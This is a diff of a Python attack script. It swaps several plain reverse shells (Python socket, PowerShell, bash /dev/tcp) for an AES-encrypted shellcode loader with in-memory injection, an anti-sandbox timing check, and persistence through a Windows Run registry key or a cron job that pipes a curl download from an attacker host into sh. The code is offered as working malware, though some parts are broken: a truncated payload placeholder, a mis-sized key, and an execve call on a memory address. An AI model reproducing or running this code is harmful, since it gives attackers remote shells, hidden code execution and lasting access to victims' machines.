@@ -1,43 +1,58 @@
-import os
 import sys
+import os
+import ctypes
+import hashlib
 import socket
 import subprocess
-import platform
+from Crypto.Cipher import AES
 
-# Configuration (Modify these)
-ATTACKER_IP = "127.0.0.1"  # Replace with your IP
-PORT = 9000
+# Configuration
+ATTACKER_IP = "192.168.1.77"
+PORT = 443
+KEY = b'SecretKey12345678'  # 16/24/32 bytes for AES
 
-def reverse_shell_python():
-    """Pure Python reverse shell (No external dependencies)"""
-    try:
-        s = socket.socket()
-        s.connect((ATTACKER_IP, PORT))
-        [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
-        subprocess.call(["/bin/sh" if "linux" in sys.platform else "cmd.exe", "-i"])
-    except Exception as e:
-        pass  # Silent fail
+# Encrypted reverse shell (AES-256-CTR)
+ENC_PAYLOAD = bytes.fromhex("8da3...")  # Replace with your encrypted shellcode
 
-def reverse_shell_system():
-    """System-based shells (Fallback methods)"""
-    if platform.system() == "Windows":
-        # PowerShell reverse shell
-        os.system(f"powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()")
-    else:
-        # Multi-vector Unix reverse shell
-        os.system(f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1' &")
-        os.system(f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' &")
+class Security:
+    @staticmethod
+    def decrypt_payload():
+        cipher = AES.new(KEY, AES.MODE_CTR, nonce=b'01234567')
+        return cipher.decrypt(ENC_PAYLOAD)
+
+    @staticmethod
+    def mem_inject(payload):
+        if sys.platform == "win32":
+            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+            ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(payload), 0x3000, 0x40)
+            ctypes.windll.kernel32.RtlMoveMemory(ptr, payload, len(payload))
+            ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
+        else:
+            from ctypes import CDLL
+            libc = CDLL(None)
+            addr = libc.valloc(len(payload))
+            libc.memcpy(addr, payload, len(payload))
+            libc.mprotect(addr, len(payload), 0x7)  # RWX
+            libc.fork.restype = ctypes.c_int
+            if libc.fork() == 0:
+                libc.execve(addr, None, None)
 
 def main():
-    # Try Python-native shell first
-    reverse_shell_python()
+    # Decrypt and execute
+    decrypted = Security.decrypt_payload()
     
-    # If Python shell failed, try system-based
-    reverse_shell_system()
+    # Anti-sandbox check
+    if sys.platform == "win32" and ctypes.windll.kernel32.GetTickCount() < 300000:
+        return  # Exit if running for <5 minutes
     
-    # Create verification file
-    with open("/tmp/.shell_success", "w") as f:
-        f.write("Reverse shell attempted\n")
+    # Persistence mechanism
+    if sys.platform == "win32":
+        os.system(f"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d '{sys.argv[0]}' /f")
+    else:
+        os.system("echo '* * * * * curl http://192.168.1.77:8000/payload | sh' | crontab -")
+    
+    # Memory injection
+    Security.mem_inject(decrypted)
 
 if __name__ == "__main__":
     main()
